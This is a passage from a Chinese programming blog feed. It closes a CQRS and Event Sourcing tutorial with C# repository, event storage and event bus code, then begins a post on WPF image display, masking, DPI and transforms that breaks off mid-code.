<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">public class Repository&lt;T&gt; : IRepository&lt;T&gt; where T : AggregateRoot, new()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IEventStorage _storage;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">object</span> _lockStorage = <span class="keyword">new</span> <span class="keyword">object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Repository</span>(<span class="params">IEventStorage storage</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _storage = storage;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Save</span>(<span class="params">AggregateRoot aggregate, <span class="keyword">int</span> expectedVersion</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (aggregate.GetUncommittedChanges().Any())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">lock</span> (_lockStorage)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> item = <span class="keyword">new</span> T();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (expectedVersion != <span class="number">-1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    item = GetById(aggregate.Id);</span><br><span class="line">                    <span class="keyword">if</span> (item.Version != expectedVersion)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrencyException(<span class="keyword">string</span>.Format(<span class="string">"Aggregate &#123;0&#125; has been previously modified"</span>,</span><br><span class="line">                                                                        item.Id));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                _storage.Save(aggregate);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">GetById</span>(<span class="params">Guid id</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        IEnumerable&lt;Event&gt; events;</span><br><span class="line">        <span class="keyword">var</span> memento = _storage.GetMemento&lt;BaseMemento&gt;(id);</span><br><span class="line">        <span class="keyword">if</span> (memento != <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            events = _storage.GetEvents(id).Where(e=&gt;e.Version&gt;=memento.Version);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            events = _storage.GetEvents(id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> obj = <span class="keyword">new</span> T();</span><br><span class="line">        <span class="keyword">if</span>(memento!=<span class="literal">null</span>)</span><br><span class="line">            ((IOriginator)obj).SetMemento(memento);</span><br><span class="line">            </span><br><span class="line">        obj.LoadsFromHistory(events);</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这个方法主要是用来对事件进行持久化的。所有的聚合的变动都会存在该 Repository 中，首先，检查当前的聚合是否和之前存储在 storage 中的聚合一致，如果不一致，则表示对象在其他地方被更改过，抛出 ConcurrencyException，否则将该变动保存在 Event Storage 中。<br>&emsp;&emsp;IEventStorage 用来存储所有的事件，其实现类型为 InMemoryEventStorage。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">InMemoryEventStorage</span>:<span class="title">IEventStorage</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Event&gt; _events;</span><br><span class="line">    <span class="keyword">private</span> List&lt;BaseMemento&gt; _mementos;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IEventBus _eventBus;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InMemoryEventStorage</span>(<span class="params">IEventBus eventBus</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _events = <span class="keyword">new</span> List&lt;Event&gt;();</span><br><span class="line">        _mementos = <span class="keyword">new</span> List&lt;BaseMemento&gt;();</span><br><span class="line">        _eventBus = eventBus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IEnumerable&lt;Event&gt; <span class="title">GetEvents</span>(<span class="params">Guid aggregateId</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> events = _events.Where(p =&gt; p.AggregateId == aggregateId).Select(p =&gt; p);</span><br><span class="line">        <span class="keyword">if</span> (events.Count() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AggregateNotFoundException(<span class="keyword">string</span>.Format(<span class="string">"Aggregate with Id: &#123;0&#125; was not found"</span>, aggregateId));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> events;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Save</span>(<span class="params">AggregateRoot aggregate</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> uncommittedChanges = aggregate.GetUncommittedChanges();</span><br><span class="line">        <span class="keyword">var</span> version = aggregate.Version;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> @<span class="keyword">event</span> <span class="keyword">in</span> uncommittedChanges)</span><br><span class="line">        &#123;</span><br><span class="line">            version++;</span><br><span class="line">            <span class="keyword">if</span> (version &gt; <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (version % <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">var</span> originator = (IOriginator)aggregate;</span><br><span class="line">                    <span class="keyword">var</span> memento = originator.GetMemento();</span><br><span class="line">                    memento.Version = version;</span><br><span class="line">                    SaveMemento(memento);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="keyword">event</span>.Version=version;</span><br><span class="line">            _events.Add(@<span class="keyword">event</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> @<span class="keyword">event</span> <span class="keyword">in</span> uncommittedChanges)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> desEvent = Converter.ChangeTo(@<span class="keyword">event</span>, @<span class="keyword">event</span>.GetType());</span><br><span class="line">            _eventBus.Publish(desEvent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> T GetMemento&lt;T&gt;(Guid aggregateId) <span class="keyword">where</span> T : BaseMemento</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> memento = _mementos.Where(m =&gt; m.Id == aggregateId).Select(m=&gt;m).LastOrDefault();</span><br><span class="line">        <span class="keyword">if</span> (memento != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> (T) memento;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SaveMemento</span>(<span class="params">BaseMemento memento</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _mementos.Add(memento);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在 GetEvent 方法中，会找到所有的聚合根 Id 相关的事件。在 Save 方法中，将所有的事件保存在内存中，然后每隔三个事件建立一个快照。可以看到这里面使用了备忘录模式。<br>&emsp;&emsp;然后在 foreach 循环中，对于所有的没有提交的变更，EventBus 将该事件发布出去。<br>&emsp;&emsp;现在，所有的发生变更的事件已经记录下来了。事件已经被发布到 EventBus 上，然后对应的 EventHandler 再处理对应的事件，然后与 DB 交互。现在来看 EventBus 的 Publish 方法。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">EventBus</span>:<span class="title">IEventBus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> IEventHandlerFactory _eventHandlerFactory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EventBus</span>(<span class="params">IEventHandlerFactory eventHandlerFactory</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _eventHandlerFactory = eventHandlerFactory;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> Publish&lt;T&gt;(T @<span class="keyword">event</span>) <span class="keyword">where</span> T : Event</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> handlers = _eventHandlerFactory.GetHandlers&lt;T&gt;();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> eventHandler <span class="keyword">in</span> handlers)</span><br><span class="line">        &#123;</span><br><span class="line">            eventHandler.Handle(@<span class="keyword">event</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看到 EventBus 的 Publish 和 CommandBus 中的 Send 方法很相似，都是首先通过 EventHandlerFactory 查找对应 Event 的 Handler，然后调用其 Handler 方法。比如：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">StructureMapEventHandlerFactory</span> : <span class="title">IEventHandlerFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> IEnumerable&lt;IEventHandler&lt;T&gt;&gt; GetHandlers&lt;T&gt;() <span class="keyword">where</span> T : Event</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> handlers = GetHandlerType&lt;T&gt;();</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">var</span> lstHandlers = handlers.Select(handler =&gt; (IEventHandler&lt;T&gt;) ObjectFactory.GetInstance(handler)).ToList();</span><br><span class="line">        <span class="keyword">return</span> lstHandlers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> IEnumerable&lt;Type&gt; GetHandlerType&lt;T&gt;() <span class="keyword">where</span> T : Event</span><br><span class="line">    &#123;</span><br><span class="line">           </span><br><span class="line">        <span class="keyword">var</span> handlers = <span class="keyword">typeof</span>(IEventHandler&lt;&gt;).Assembly.GetExportedTypes()</span><br><span class="line">            .Where(x =&gt; x.GetInterfaces()</span><br><span class="line">                .Any(a =&gt; a.IsGenericType &amp;&amp; a.GetGenericTypeDefinition() == <span class="keyword">typeof</span>(IEventHandler&lt;&gt;)))</span><br><span class="line">                .Where(h =&gt; h.GetInterfaces()</span><br><span class="line">                    .Any(ii =&gt; ii.GetGenericArguments()</span><br><span class="line">                        .Any(aa =&gt; aa == <span class="keyword">typeof</span>(T))))</span><br><span class="line">                 .ToList();</span><br><span class="line">        <span class="keyword">return</span> handlers;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后返回并实例化了 ItemCreatedEventHandler 对象，该对象的实现如下：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class ItemCreatedEventHandler : IEventHandler&lt;ItemCreatedEvent&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IReportDatabase _reportDatabase;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ItemCreatedEventHandler</span>(<span class="params">IReportDatabase reportDatabase</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _reportDatabase = reportDatabase;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Handle</span>(<span class="params">ItemCreatedEvent handle</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        DiaryItemDto item = <span class="keyword">new</span> DiaryItemDto()</span><br><span class="line">            &#123;</span><br><span class="line">                Id = handle.AggregateId,</span><br><span class="line">                Description =  handle.Description,</span><br><span class="line">                From = handle.From,</span><br><span class="line">                Title = handle.Title,</span><br><span class="line">                To=handle.To,</span><br><span class="line">                Version =  handle.Version</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">        _reportDatabase.Add(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看到在 Handler 方法中，从事件中获取参数，然后新建 DTO 对象，然后将该对象更新到DB中。<br>&emsp;&emsp;到此，整个 Command 执行完成。  </p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>&emsp;&emsp;CQRS 是一种思想很简单清晰的设计模式，他通过在业务上分离操作和查询来使得系统具有更好的可扩展性及性能，使得能够对系统的不同部分进行扩展和优化。在 CQRS 中，所有的涉及到对 DB 的操作都是通过发送 Command，然后特定的 Command 触发对应事件来完成操作，这个过程是异步的，并且所有涉及到对系统的变更行为都包含在具体的事件中，结合 Event Sourcing 模式，可以记录下所有的事件，而不是以往的某一点的数据信息，这些信息可以作为系统的操作日志，可以来对系统进行回退或者重放。<br>&emsp;&emsp;CQRS 模式在实现上有些复杂，很多地方比如 AggregateRoot、Domain Object 都涉及到 DDD 中的相关概念，本人对 DDD 不太懂。这里仅为了演示 CQRS 模式，所以使用的例子是 codeproject 上的，末尾列出了一些参考文章，如果您想了解更多，可以有针对性的阅读。<br>&emsp;&emsp;最后，希望 CQRS 模式能让您在设计高性能，可扩展性的程序时能够多一种选择和考虑。  </p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li>Introduction to CQRS <a href="http://www.codeproject.com/Articles/555855/Introduction-to-CQRS" target="_blank" rel="noopener">http://www.codeproject.com/Articles/555855/Introduction-to-CQRS</a></li>
<li>CQRS <a href="http://martinfowler.com/bliki/CQRS.html" target="_blank" rel="noopener">http://martinfowler.com/bliki/CQRS.html</a></li>
<li>CQRS Journey <a href="http://msdn.microsoft.com/en-us/library/jj554200.aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/jj554200.aspx</a></li>
<li>Command and Query Responsibility Segregation (CQRS) Pattern <a href="http://msdn.microsoft.com/en-us/library/dn568103.aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/dn568103.aspx</a></li>
<li>EntityFramework之领域驱动设计实践：CQRS 体系结构模式 <a href="http://www.cnblogs.com/daxnet/archive/2010/08/02/1790299.html" target="_blank" rel="noopener">http://www.cnblogs.com/daxnet/archive/2010/08/02/1790299.html</a></li>
<li>Event Sourcing Pattern <a href="http://msdn.microsoft.com/en-us/library/dn589792.aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/dn589792.aspx</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
            <tag> CSharp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WPF 中的一些图片处理方法]]></title>
      <url>/2019/12/21/WpfPictureEditing/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/Big-Head/p/12068230.html" target="_blank" rel="noopener">https://www.cnblogs.com/Big-Head/p/12068230.html</a></p>
</blockquote>
<a id="more"></a>

<h1 id="视觉处理（控件展示）"><a href="#视觉处理（控件展示）" class="headerlink" title="视觉处理（控件展示）"></a>视觉处理（控件展示）</h1><h2 id="显示图片"><a href="#显示图片" class="headerlink" title="显示图片"></a>显示图片</h2><ul>
<li><p>Image 控件展示</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Xaml 代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Image</span> <span class="attr">source</span>=<span class="string">"/Resources/Images/1.png"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>缩放位图渲染算法</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Xaml 代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Image</span> <span class="attr">Source</span>=<span class="string">"/Resources/Images/1.jpg"</span> <span class="attr">RenderOptions.BitmapScalingMode</span>=<span class="string">"Fant"</span>/&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="image-box">
                <img src="1339560-20191219153556097-1850707127.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="1339560-20191219153638399-1286296574.png" alt title class>
                <p></p>
            </figure>

<table>
<thead>
<tr>
<th>枚举值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Fant</td>
<td>使用超高质量 Fant 位图缩放，虽然速度比所有其他位图缩放模式都慢，但输出质量更高。</td>
</tr>
<tr>
<td>HighQuality</td>
<td>使用高质量位图缩放，虽然速度比 LowQuality 模式慢，但输出质量更高。 HighQuality 模式与 Fant 模式相同。</td>
</tr>
<tr>
<td>Linear</td>
<td>使用线性位图缩放，虽然速度比 HighQuality 模式快，但输出质量较低。</td>
</tr>
<tr>
<td>LowQuality</td>
<td>使用双线性位图缩放，虽然速度比 HighQuality 快，但输出质量较低。 LowQuality 模式与 Linear 模式相同。</td>
</tr>
<tr>
<td>NearesNeighbor</td>
<td>使用最近邻域位图缩放，当使用软件光栅器时，该缩放提供优于 LowQuality 模式的性能。 该模式常用于放大位图。</td>
</tr>
<tr>
<td>Unspecified</td>
<td>使用默认位图缩放模式，即 Linear。</td>
</tr>
</tbody></table>
<h2 id="Image-遮罩"><a href="#Image-遮罩" class="headerlink" title="Image 遮罩"></a>Image 遮罩</h2><ul>
<li>OpacityMask</li>
</ul>
<blockquote>
<p>来自微软官方的说明：<br><strong>获取或设置一个作为 Brush 实现的不透明蒙板，该蒙板可应用到此元素所呈现内容的任何 Alpha 通道蒙板。 这是依赖项属性。</strong></p>
</blockquote>
<blockquote>
<p>来自个人的经验解释：<br><strong>OpacityMask 也是一张图片，它用来改变被它遮住的内容的显示区域</strong><br><strong>OpacityMasK 本身：有内容的区域被镂空，没有内容的区域被填充</strong><br><strong>被它遮住的控件或者画布：镂空的区域就展示，填充的区域变透明</strong></p>
</blockquote>
<figure class="image-box">
                <img src="1339560-20191219153907182-317533868.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="1339560-20191219153940114-473450059.png" alt title class>
                <p></p>
            </figure>

<h2 id="图片-DPI"><a href="#图片-DPI" class="headerlink" title="图片 DPI"></a>图片 DPI</h2><ul>
<li>图片 DPI 是每英寸显示的点的个数（点/英寸）</li>
<li>图片的宽像素 = 宽 dpi * 尺寸</li>
<li>图片的高像素 = 高 dpi * 尺寸</li>
<li>WPF 中，所有图片在 Xaml 中都会被强制拉成 96 dpi。</li>
</ul>
<figure class="image-box">
                <img src="1339560-20191219154046318-2041824279.png" alt title class>
                <p></p>
            </figure>

<h2 id="控件的-Transform"><a href="#控件的-Transform" class="headerlink" title="控件的 Transform"></a>控件的 Transform</h2><blockquote>
<p>来自微软官方的说明：<br>Transform 定义如何将点从一个坐标空间映射或转换到另一个坐标空间。 此映射由转换 Matrix描述，该转换是包含三列 Double 值的三行的集合。</p>
</blockquote>
<table>
<thead>
<tr>
<th>枚举值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>RotateTransform</td>
<td>按指定角度旋转元素。</td>
</tr>
<tr>
<td>ScaleTranform</td>
<td>按指定的 ScaleX 和 ScaleY 量来缩放元素。</td>
</tr>
<tr>
<td>SkewTransform</td>
<td>按指定的 AngleX 和 AngleY 量倾斜元素。</td>
</tr>
<tr>
<td>TranslateTransform</td>
<td>按指定的 X 和 Y 量移动（平移）元素。</td>
</tr>
</tbody></table>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Xaml 代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Image</span> <span class="attr">Width</span>=<span class="string">"450"</span> <span class="attr">Source</span>=<span class="string">"/Images/3.jpg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Image.RenderTransform</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TransformGroup</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">TranslateTransform</span> <span class="attr">X</span>=<span class="string">"10"</span> <span class="attr">Y</span>=<span class="string">"10"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">RotateTransform</span> <span class="attr">Angle</span>=<span class="string">"20"</span> <span class="attr">CenterX</span>=<span class="string">"200"</span> <span class="attr">CenterY</span>=<span class="string">"121"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ScaleTransform</span> <span class="attr">ScaleX</span>=<span class="string">"1.5"</span> <span class="attr">ScaleY</span>=<span class="string">"1.5"</span> <span class="attr">CenterX</span>=<span class="string">"200"</span> <span class="attr">CenterY</span>=<span class="string">"121"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">SkewTransform</span> <span class="attr">AngleX</span>=<span class="string">"10"</span> <span class="attr">AngleY</span>=<span class="string">"10"</span> <span class="attr">CenterX</span>=<span class="string">"200"</span> <span class="attr">CenterY</span>=<span class="string">"121"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">TransformGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Image.RenderTransform</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Image</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="1339560-20191219154150547-1910194833.png" alt title class>
                <p></p>
            </figure>

<hr>
<h1 id="输出文件"><a href="#输出文件" class="headerlink" title="输出文件"></a>输出文件</h1><h2 id="显示图片-1"><a href="#显示图片-1" class="headerlink" title="显示图片"></a>显示图片</h2><h3 id="BitmapImage-的保存"><a href="#BitmapImage-的保存" class="headerlink" title="BitmapImage 的保存"></a>BitmapImage 的保存</h3><p>与 Bitmap.Save() 不同，需要对 BitmapImage 的数据转为 Stream，通过文件流保存</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C# 代码</span></span><br><span class="line">BitmapEncoder encoder = <span class="keyword">new</span> PngBitmapEncoder();</span><br><span class="line">encoder.Frame.Add(BitmapFrame.Create(bitmapImage));</span><br><span class="line"><span class="keyword">using</span>(<span class="keyword">var</span> stream=<span class="keyword">new</span> FileStream(path, FileMode.Create))</span><br><span class="line">&#123;</span><br><span class="line">    encoder.Save(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BitmapImage-的-Width-Height-和-PixelWidth-PixelHeight"><a href="#BitmapImage-的-Width-Height-和-PixelWidth-PixelHeight" class="headerlink" title="BitmapImage 的 Width, Height 和 PixelWidth, PixelHeight"></a>BitmapImage 的 Width, Height 和 PixelWidth, PixelHeight</h3><blockquote>
<p>Width 和 Height：获取位图的宽/高度（以与设备无关的单位（每个单位 1/96 英寸）为单位）。<strong>（会根据电脑 DPI 的更改获取到不同的值）</strong><br>PixelWidth 和 PixelHeight：获取位图的宽/高度（以像素为单位）</p>
</blockquote>
<h3 id="BitmapImage-与-Bitmap-的互相转换"><a href="#BitmapImage-与-Bitmap-的互相转换" class="headerlink" title="BitmapImage 与 Bitmap 的互相转换"></a>BitmapImage 与 Bitmap 的互相转换</h3><p>同样是转为流数据，向Bitmap的构造函数传参</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C# 代码</span></span><br><span 